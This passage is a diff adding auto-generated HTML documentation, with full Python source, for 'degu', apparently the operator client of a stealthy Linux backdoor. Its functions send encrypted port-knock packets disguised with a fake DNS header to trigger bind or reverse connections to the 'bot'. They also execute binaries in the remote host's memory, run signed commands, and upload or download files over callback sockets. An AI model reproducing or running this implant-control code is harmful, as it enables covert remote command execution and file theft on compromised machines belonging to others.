+    rand = mock_dns()
+    self.xcrypt_knock(rand)
+    sig  = self.sign_msg(mycmd)
+    payload = rand + b&#34;\xc0\x57&#34; + struct.pack(&#34;H&#34;,len(mycmd)) +  mycmd + sig + b&#39;\x00&#39;*1000
+    return self.xcrypt_knock(payload)</code></pre>
+</details>
+</dd>
+<dt id="degu.degu.mkbuf_knock"><code class="name flex">
+<span>def <span class="ident">mkbuf_knock</span></span>(<span>self, addr)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>make knock message</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>addr</code></strong> :&ensp;<code>byte</code></dt>
+<dd>target host</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>byte</code></dt>
+<dd>ciphered knock buffer with DNS header</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def mkbuf_knock(self,addr):
+    &#34;&#34;&#34;make knock message
+
+    Args:
+        addr (byte): target host
+
+    Returns:
+        byte: ciphered knock buffer with DNS header
+    &#34;&#34;&#34;        
+
+    buf_rand = mock_dns()
+    self.xcrypt_knock(buf_rand)
+    self.log.debug(&#34;knocking %s&#34;%addr)
+    payload = None
+    if addr.startswith(b&#34;:&#34;):
+        try:
+            port = int(addr[1:])
+            self.port = port
+            self.log.debug(&#34;trying remote bind on %s:%i&#34;%(self.host,port))
+            f = struct.pack(&#34;H&#34;,port)
+            payload = buf_rand + b&#34;\xb0\x0b&#34; + f + b&#34;\0&#34;*1000
+        except ValueError:
+            self.log.error(f&#34;Port {addr[1:]} is invalid&#34;)
+    else:
+        try:
+            sip,sport = addr.split(b&#34;:&#34;)
+            self.log.debug(f&#34;trying backconnect on {sip}:{sport}&#34;)
+            ip = bytes(map(int, sip.split(b&#39;.&#39;)))
+            port = int(sport)
+            f = struct.pack(&#34;H&#34;,port)
+            payload = buf_rand + b&#34;\xc4\x11&#34; + ip + f + b&#34;\0&#34;*1000
+        except Exception as exc:
+            self.log.error(&#34;addr %s is invalid : %s&#34;%(addr,exc))
+    if payload:
+        return self.xcrypt_knock( payload )
+    return None</code></pre>
+</details>
+</dd>
+<dt id="degu.degu.mkbuf_mem_exec"><code class="name flex">
+<span>def <span class="ident">mkbuf_mem_exec</span></span>(<span>self, bin, param, pub, memfd=False)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>make memexec buffer</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>bin</code></strong> :&ensp;<code>byte</code></dt>
+<dd>binary to send</dd>
+<dt><strong><code>param</code></strong> :&ensp;<code>byte[]</code></dt>
+<dd>arguments to binary don't forget args[0] for exe name</dd>
+<dt><strong><code>pub</code></strong> :&ensp;<code>byte</code></dt>
+<dd>public key of degu instance</dd>
+<dt><strong><code>memfd</code></strong> :&ensp;<code>bool</code>, optional</dt>
+<dd>use memfd instead of ulexec. Defaults to False.</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>byte</code></dt>
+<dd>encrypted byte buffer to send</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def mkbuf_mem_exec(self, bin, param, pub, memfd=False):
+    &#34;&#34;&#34;make memexec buffer
+
+    Args:
+        bin (byte): binary to send
+        param (byte[]): arguments to binary don&#39;t forget args[0] for exe name
+        pub (byte): public key of degu instance
+        memfd (bool, optional): use memfd instead of ulexec. Defaults to False.
+
+    Returns:
+        byte: encrypted byte buffer to send
+
+    &#34;&#34;&#34;        
+
+    if not self.bot_pubkey :
+        self.bot_pubkey = self.xcrypt_knock( pub )
+    data = create_bin_string( bin, param, memfd=memfd )
+    return self.xbuf( data )</code></pre>
+</details>
+</dd>
+<dt id="degu.degu.mkbuf_upload"><code class="name flex">
+<span>def <span class="ident">mkbuf_upload</span></span>(<span>self, file, path, pub)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>make upload buffer</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>file</code></strong> :&ensp;<code>byte</code></dt>
+<dd>local filename to read</dd>
+<dt><strong><code>path</code></strong> :&ensp;<code>byte</code></dt>
+<dd>remote path to use for upload</dd>
+<dt><strong><code>pub</code></strong> :&ensp;<code>byte</code></dt>
+<dd>public key of degu instance</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>byte</code></dt>
+<dd>ciphered upload data command</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def mkbuf_upload( self, file , path, pub ):
+    &#34;&#34;&#34;make upload buffer
+
+    Args:
+        file (byte): local filename to read
+        path (byte): remote path to use for upload
+        pub (byte): public key of degu instance
+
+    Returns:
+        byte: ciphered upload data command
+    &#34;&#34;&#34;        
+
+    if not self.bot_pubkey :
+        self.bot_pubkey = self.xcrypt_knock( pub )
+    data = create_up_string( path , file )
+    return self.xbuf( data )</code></pre>
+</details>
+</dd>
+<dt id="degu.degu.rdownload"><code class="name flex">
+<span>def <span class="ident">rdownload</span></span>(<span>self, path, lport, timeout=5)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>reverse connect download file from bot to client</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>path</code></strong> :&ensp;<code>byte</code></dt>
+<dd>file path on server to download</dd>
+<dt><strong><code>lport</code></strong> :&ensp;<code>int</code></dt>
+<dd>local port to listen to</dd>
+<dt><strong><code>timeout</code></strong> :&ensp;<code>int</code>, optional</dt>
+<dd>timeout to file receive. Defaults to 5.</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>byte</code></dt>
+<dd>contents of file or None if error</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def rdownload(self,path,lport,timeout=5):
+    &#34;&#34;&#34; reverse connect download file from bot to client
+
+    Args:
+        path (byte): file path on server to download
+        lport (int): local port to listen to
+        timeout (int, optional): timeout to file receive. Defaults to 5.
+
+    Returns:
+        byte: contents of file or None if error
+    &#34;&#34;&#34;        
+
+    self.log.info(f&#34;CB downloading {path.decode()}&#34;)
+    serv = socket.socket()
+    serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    serv.bind((&#39;0.0.0.0&#39;, int(lport)))
+    serv.settimeout(timeout)
+    serv.listen(512)
+    s, _ = serv.accept()
+    pub = s.recv(32)
+    data = self.mkbuf_download(path,pub)
+    s.send(data)
+    recvdata = b&#34;&#34;
+    while 1:
+        tmp = s.recv(4096)
+        if tmp :
+            recvdata += tmp
+        else :
+            break
+    if len(recvdata) &gt; 4:
+        self.xbuf(recvdata)
+        lmsg = struct.unpack(&#34;&gt;I&#34;,recvdata[:4])[0]
+        s.close()
+        return recvdata[4:lmsg+4]
+    else:
+        self.log.error(&#34;no recv :(&#34;)
+    s.close()
+    return None</code></pre>
+</details>
+</dd>
+<dt id="degu.degu.rhelper"><code class="name flex">
+<span>def <span class="ident">rhelper</span></span>(<span>self, bin, param, lport, timeout=5, memfd=False)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>reverse connect execute binary in memory and return socket for reuse</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>bin</code></strong> :&ensp;<code>byte</code></dt>
+<dd>helper binary to use</dd>
+<dt><strong><code>param</code></strong> :&ensp;<code>byte[]</code></dt>
+<dd>arguments to binary don't forget args[0] for exe name</dd>
+<dt><strong><code>lport</code></strong> :&ensp;<code>int</code></dt>
+<dd>local port to listen to</dd>
+<dt><strong><code>timeout</code></strong> :&ensp;<code>int</code>, optional</dt>
+<dd>timeout to file send. Defaults to 5.</dd>
+<dt><strong><code>memfd</code></strong> :&ensp;<code>bool</code>, optional</dt>
+<dd>use memfd instead of ulexec. Defaults to False.</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>socket</code></dt>
+<dd>socket object from degu session</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def rhelper(self, bin, param, lport, timeout=5, memfd=False):
+    &#34;&#34;&#34; reverse connect execute binary in memory and return socket for reuse
+
+    Args:
+        bin (byte): helper binary to use
+        param (byte[]): arguments to binary don&#39;t forget args[0] for exe name
+        lport (int): local port to listen to
+        timeout (int, optional): timeout to file send. Defaults to 5.
+        memfd (bool, optional): use memfd instead of ulexec. Defaults to False.
+
+    Returns:
+        socket: socket object from degu session
+    &#34;&#34;&#34;
+    self.log.info(&#34;Sending bin %s params &#39;%s&#39; &#34;%(b,param.decode()))
+    serv = socket.socket()
+    serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    serv.bind((&#39;0.0.0.0&#39;, int(lport)))
+    serv.settimeout(timeout)
+    serv.listen(512)
+    s, _ = serv.accept()
+    pub = s.recv(32)
+    data = self.mkbuf_mem_exec(bin, param, pub,memfd=memfd)
+    s.send(data)
+    return s</code></pre>
+</details>
+</dd>
+<dt id="degu.degu.rmem_exec"><code class="name flex">
+<span>def <span class="ident">rmem_exec</span></span>(<span>self, bin, param, lport, timeout=5)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>reverse connect execute binary in memory and close socket</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>bin</code></strong> :&ensp;<code>byte</code></dt>
+<dd>executable binary to use</dd>
+<dt><strong><code>param</code></strong> :&ensp;<code>byte[]</code></dt>
+<dd>arguments to binary don't forget args[0] for exe name</dd>
+<dt><strong><code>lport</code></strong> :&ensp;<code>int</code></dt>
+<dd>local port to listen to</dd>
+<dt><strong><code>timeout</code></strong> :&ensp;<code>int</code>, optional</dt>
+<dd>timeout to file send. Defaults to 5.</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def rmem_exec(self, bin, param, lport, timeout=5):
+    &#34;&#34;&#34; reverse connect execute binary in memory and close socket
+
+    Args:
+        bin (byte): executable binary to use
+        param (byte[]): arguments to binary don&#39;t forget args[0] for exe name
+        lport (int): local port to listen to
+        timeout (int, optional): timeout to file send. Defaults to 5.
+    &#34;&#34;&#34;
+    self.log.info(&#34;Sending bin %s params &#39;%s&#39; &#34;%(b,param.decode()))
+    serv = socket.socket()
+    serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    serv.bind((&#39;0.0.0.0&#39;, int(lport)))
+    serv.settimeout(timeout)
+    serv.listen(512)
+    s, _ = serv.accept()
+    pub = s.recv(32)
+    data = self.mkbuf_mem_exec(bin, param, pub)
+    s.send(data)
+    s.close()</code></pre>
+</details>
+</dd>
+<dt id="degu.degu.rupload"><code class="name flex">
+<span>def <span class="ident">rupload</span></span>(<span>self, file, path, lport, timeout=5)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>reverse connect upload file from client to bot</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>file</code></strong> :&ensp;<code>byte</code></dt>
+<dd>local filename to read</dd>
+<dt><strong><code>path</code></strong> :&ensp;<code>byte</code></dt>
+<dd>remote path to use for upload</dd>
+<dt><strong><code>lport</code></strong> :&ensp;<code>int</code></dt>
+<dd>local port to listen to</dd>
+<dt><strong><code>timeout</code></strong> :&ensp;<code>int</code>, optional</dt>
+<dd>timeout to file send. Defaults to 5.</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>int</code></dt>
+<dd>len of uploaded data or None</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def rupload(self, file , path, lport, timeout=5 ):
+    &#34;&#34;&#34; reverse connect upload file from client to bot
+
+    Args:
+        file (byte): local filename to read
+        path (byte): remote path to use for upload
+        lport (int): local port to listen to
+        timeout (int, optional): timeout to file send. Defaults to 5.
+
+    Returns:
+        int: len of uploaded data or None
+    &#34;&#34;&#34;        
+
+    self.log.info(f&#34;cb Uploading {file.decode()} {path.decode()}&#34;)
+    serv = socket.socket()
+    serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    serv.bind((&#39;0.0.0.0&#39;, int(lport)))
+    serv.settimeout(timeout)
+    serv.listen(512)
+    s, _ = serv.accept()
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack(&#39;ii&#39;, 1, 0))
+    pub = s.recv(32)
+    data = self.mkbuf_upload(file, path, pub)
+    if not data :
+        return None
+    ret = s.send(data)
+    s.close()
+    return ret</code></pre>
+</details>
+</dd>
+<dt id="degu.degu.sign_msg"><code class="name flex">
+<span>def <span class="ident">sign_msg</span></span>(<span>self, data)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>get data signature</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>data</code></strong> :&ensp;<code>byte</code></dt>
+<dd>data to sign</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>byte</code></dt>
+<dd>signature</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def sign_msg(self,data):
+    &#34;&#34;&#34;get data signature
+
+    Args:
+        data (byte): data to sign
+
+    Returns:
+        byte: signature
+    &#34;&#34;&#34;        
+    sig = ctypes.create_string_buffer(64)
+    self.lib.xsig(sig,data,len(data),self.priv)
+    return sig.raw</code></pre>
+</details>
+</dd>
+<dt id="degu.degu.upload"><code class="name flex">
+<span>def <span class="ident">upload</span></span>(<span>self, file, path)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>bind connect upload file from client to bot</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>file</code></strong> :&ensp;<code>byte</code></dt>
+<dd>local filename to read</dd>
+<dt><strong><code>path</code></strong> :&ensp;<code>byte</code></dt>
+<dd>remote path to use for upload</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>int</code></dt>
+<dd>len of uploaded data or None</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def upload(self, file , path ):
+    &#34;&#34;&#34;bind connect upload file from client to bot
+
+    Args:
+        file (byte): local filename to read
+        path (byte): remote path to use for upload
+    Returns:
+        int: len of uploaded data or None
+    &#34;&#34;&#34;        
+    self.log.info(f&#34;Uploading {file.decode()} {path.decode()}&#34;)
+    s = socket.socket()
+    s.connect((self.host,self.port))
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack(&#39;ii&#39;, 1, 0))
+    pub = s.recv(32)
+    data = self.mkbuf_upload(file, path, pub)
+    if not data :
+        return None
+    ret = s.send(data)
+    s.close()
+    return ret</code></pre>
+</details>
+</dd>
+<dt id="degu.degu.xbuf"><code class="name flex">
+<span>def <span class="ident">xbuf</span></span>(<span>self, data)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>encrypt/decrypt data with session context</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>data</code></strong> :&ensp;<code>byte</code></dt>
+<dd>data to cipher with current aes context</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>byte</code></dt>
+<dd>ciphered data</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def xbuf(self,data):
+    &#34;&#34;&#34;encrypt/decrypt data with session context
+
+    Args:
+        data (byte): data to cipher with current aes context
+
+    Returns:
+        byte: ciphered data
+    &#34;&#34;&#34;        
+    if not data:
+        return None
+    self.lib.xbuf(self.bot_pubkey,self.priv,data,len(data))
+    return data</code></pre>
+</details>
+</dd>
+<dt id="degu.degu.xcrypt_knock"><code class="name flex">
+<span>def <span class="ident">xcrypt_knock</span></span>(<span>self, data)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>encrypt knock data with knock key</p>
+<h2 id="args">Args</h2>
+<dl>
+<dt><strong><code>data</code></strong> :&ensp;<code>byte</code></dt>
+<dd>knock to cipher/decipher</dd>
+</dl>
+<h2 id="returns">Returns</h2>
+<dl>
+<dt><code>byte</code></dt>
+<dd>ciphered/deciphered data</dd>
+</dl></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def xcrypt_knock(self,data):
+    &#34;&#34;&#34;encrypt knock data with knock key
+
+    Args:
+        data (byte): knock to cipher/decipher
+
+    Returns:
+        byte: ciphered/deciphered data
+    &#34;&#34;&#34;        
+    
+    self.lib.xnock(data,len(data))
+    return data</code></pre>
+</details>
+</dd>
+</dl>
+</dd>
+</dl>
+</section>
+</article>
+<nav id="sidebar">
+<h1>Index</h1>
+<div class="toc">
+<ul></ul>
+</div>
+<ul id="index">
+<li><h3><a href="#header-functions">Functions</a></h3>
+<ul class="">
+<li><code><a title="degu.create_bin_string" href="#degu.create_bin_string">create_bin_string</a></code></li>
+<li><code><a title="degu.create_dl_string" href="#degu.create_dl_string">create_dl_string</a></code></li>
+<li><code><a title="degu.create_up_string" href="#degu.create_up_string">create_up_string</a></code></li>
+<li><code><a title="degu.mock_dns" href="#degu.mock_dns">mock_dns</a></code></li>
+</ul>
+</li>
+<li><h3><a href="#header-classes">Classes</a></h3>
+<ul>
+<li>
+<h4><code><a title="degu.LogFmt" href="#degu.LogFmt">LogFmt</a></code></h4>
+<ul class="">
+<li><code><a title="degu.LogFmt.format" href="#degu.LogFmt.format">format</a></code></li>
+<li><code><a title="degu.LogFmt.format_time" href="#degu.LogFmt.format_time">format_time</a></code></li>
+</ul>
+</li>
+<li>
+<h4><code><a title="degu.degu" href="#degu.degu">degu</a></code></h4>
+<ul class="two-column">
+<li><code><a title="degu.degu.download" href="#degu.degu.download">download</a></code></li>
+<li><code><a title="degu.degu.getpub" href="#degu.degu.getpub">getpub</a></code></li>
+<li><code><a title="degu.degu.ghost_exec" href="#degu.degu.ghost_exec">ghost_exec</a></code></li>
+<li><code><a title="degu.degu.helper" href="#degu.degu.helper">helper</a></code></li>
+<li><code><a title="degu.degu.keygen" href="#degu.degu.keygen">keygen</a></code></li>
+<li><code><a title="degu.degu.knock" href="#degu.degu.knock">knock</a></code></li>
+<li><code><a title="degu.degu.mem_exec" href="#degu.degu.mem_exec">mem_exec</a></code></li>
+<li><code><a title="degu.degu.mkbuf_download" href="#degu.degu.mkbuf_download">mkbuf_download</a></code></li>
+<li><code><a title="degu.degu.mkbuf_ghost_exec" href="#degu.degu.mkbuf_ghost_exec">mkbuf_ghost_exec</a></code></li>
+<li><code><a title="degu.degu.mkbuf_knock" href="#degu.degu.mkbuf_knock">mkbuf_knock</a></code></li>
+<li><code><a title="degu.degu.mkbuf_mem_exec" href="#degu.degu.mkbuf_mem_exec">mkbuf_mem_exec</a></code></li>
+<li><code><a title="degu.degu.mkbuf_upload" href="#degu.degu.mkbuf_upload">mkbuf_upload</a></code></li>
+<li><code><a title="degu.degu.rdownload" href="#degu.degu.rdownload">rdownload</a></code></li>
+<li><code><a title="degu.degu.rhelper" href="#degu.degu.rhelper">rhelper</a></code></li>
+<li><code><a title="degu.degu.rmem_exec" href="#degu.degu.rmem_exec">rmem_exec</a></code></li>
+<li><code><a title="degu.degu.rupload" href="#degu.degu.rupload">rupload</a></code></li>
+<li><code><a title="degu.degu.sign_msg" href="#degu.degu.sign_msg">sign_msg</a></code></li>
+<li><code><a title="degu.degu.upload" href="#degu.degu.upload">upload</a></code></li>
+<li><code><a title="degu.degu.xbuf" href="#degu.degu.xbuf">xbuf</a></code></li>
+<li><code><a title="degu.degu.xcrypt_knock" href="#degu.degu.xcrypt_knock">xcrypt_knock</a></code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</nav>
+</main>
+<footer id="footer">
+<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
+</footer>
+</body>
+</html>
